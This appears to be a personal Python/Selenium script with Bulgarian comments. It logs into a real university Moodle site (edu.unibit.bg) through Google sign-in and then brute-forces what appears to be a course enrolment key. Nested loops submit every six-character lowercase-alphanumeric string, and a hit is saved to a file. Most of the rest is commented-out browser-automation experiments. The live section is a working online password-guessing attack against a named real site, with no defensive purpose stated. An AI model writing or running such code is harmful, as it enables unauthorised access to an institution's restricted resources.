# from selenium import webdriver
# from selenium.webdriver.chrome.options import Options
# from selenium.webdriver.chrome.webdriver import WebDriver
# from webbot import Browser
# options = Options()
# options.binary_location = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
# # driver = webdriver.Chrome(options = options, executable_path=r'C:\\Users\\GAMER\\Desktop\\chromedriver.exe')
# # driver.get('http://google.com/')

# print("Chrome Browser Invoked")
# # driver.quit()
# driver = Browser()
# # web.go_to('google.com')
# # web.type('hello its me')  # or web.press(web.Key.SHIFT + 'hello its me')
# web.press(web.Key.ENTER)
# web.go_back()
# web.click('Sign in')
# web.type('mymail@gmail.com' , into='Email')
# web.click('NEXT' , tag='span')
# web.type('mypassword' , into='Password' , id='passwordFieldId')
# web.click('NEXT' , tag='span') # you are logged in . woohoooo


import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from webbot import Browser
import itertools
import requests

actualPassword = ""
currentPassword = ""

#                                         Тук се въвежда имейла свързан с университета
email = ""
emailPassword = ""
# Постоянен timer който брои кога е изминало определено време и тогава да изпълни проверка на парола





# driver = webdriver.Chrome('./chromedriver')
# driver.get('https://stackoverflow.com/users/signup?ssrc=head&returnurl=%2fusers%2fstory%2fcurrent%27')
# time.sleep(3)
# driver.find_element_by_xpath('//*[@id="openid-buttons"]/button[1]').click()
# driver.find_element_by_xpath('//input[@type="email"]').send_keys(username)
# driver.find_element_by_xpath('//*[@id="identifierNext"]').click()
# time.sleep(3)
# driver.find_element_by_xpath('//input[@type="password"]').send_keys(password)
# driver.find_element_by_xpath('//*[@id="passwordNext"]').click()
# time.sleep(2)
# driver.get('https://youtube.com')
# time.sleep(5)

# driver = webdriver.Firefox()
# driver.get('http://google.com')
# print (driver.title)
# driver.quit()

# browser = webdriver.Chrome ('/Users/GAMER/Desktop/chromedriver')
# browser = webdriver.Firefox()
#                                                       Директорията на уеб драйвера
directoryToWebDriver = ""
browser = webdriver.Firefox(directoryToWebDriver)
# browser = webdriver.Firefox('C:/Program-Files/Mozilla-Firefox/geckodriver')
# browser = webdriver.Firefox()
# browser.get('https://edu.unibit.bg/enrol/index.php?id=1492')
# browser.get('https://edu.unibit.bg/enrol/index.php?id=1457')
browser.get('https://edu.unibit.bg/enrol/index.php?id=1454')
element = browser.find_element_by_link_text('Вход с поща в unibit.bg')
element.click()

element = browser.find_element_by_id('identifierId')
element.send_keys(email)

# element = browser.find_element_by_class_name('VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc qIypjc TrZEUc lw1w4b')
element = browser.find_element_by_class_name('VfPpkd-RLmnJb')
element.click()

time.sleep(1)

# browser.find_element_by_xpath('//input[@type="password"]').send_keys(password)

element = browser.find_element_by_xpath('//input[@type="password"]')
element.send_keys(emailPassword)

element = browser.find_element_by_class_name('VfPpkd-RLmnJb')
element.click()


time.sleep(13)
# brute force logic

element = browser.find_element_by_xpath('//input[@type="password"]')

# 48-57 65-90 97-122 ърво пробвай тертото малките букви с 2021
dictionaryStart = 65
dictionaryEnd = 90
counter = 0

# Alphabet = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_.")
# Alphabet = (" ABCDEFGHIJKLMNOPQRSTUVWXYZ")
Alphabet = ("abcdefghijklmnopqrstuvwxyz1234567890")
AlphabetZaEdno = ("RSTU")

# for j in range(counter):
# for i in range(dictionaryStart , dictionaryEnd):
massTime = 0

for i in Alphabet:
    for j in Alphabet:
        for k in Alphabet:
            for l in Alphabet:
                for m in Alphabet:
                    for n in Alphabet:
                        string = i + j + k + l + m + n
                        # print(string)
                        time1 = time.perf_counter()
                        try:
                            # element = browser.find_element_by_xpath('//input[@type="password"]')
                            element.send_keys(string)
                            element.send_keys(Keys.ENTER)
                        # time.sleep(0.05)
                            element = browser.find_element_by_xpath(
                                '//input[@type="password"]')
                            element.send_keys(Keys.CONTROL + "a")
                            element.send_keys(Keys.DELETE)
                        except:
                            f = open("poznataparolaEdno.txt", "w")
                            f.write("Poznata" + string)
                            f.close()

                        time2 = time.perf_counter()
                        massTime += time2 - time1
                        counter+=1
                        if massTime >= 1:
                            print(counter)
                            massTime=0
                            counter=0

        # time.sleep(0.05

# r = requests.get('https://edu.unibit.bg/enrol/index.php?id=1492')

# print(r.text)


# web = Browser()

# web.type('AAAA')
# web.click('Запиши ме')


# start = time.time() #start time

# for i in range(1000000):
#     pass

# end = time.time()
# print("Elapsed time is  {}".format(end-start))
# print(time.time())
# print('%s' % time.ctime())
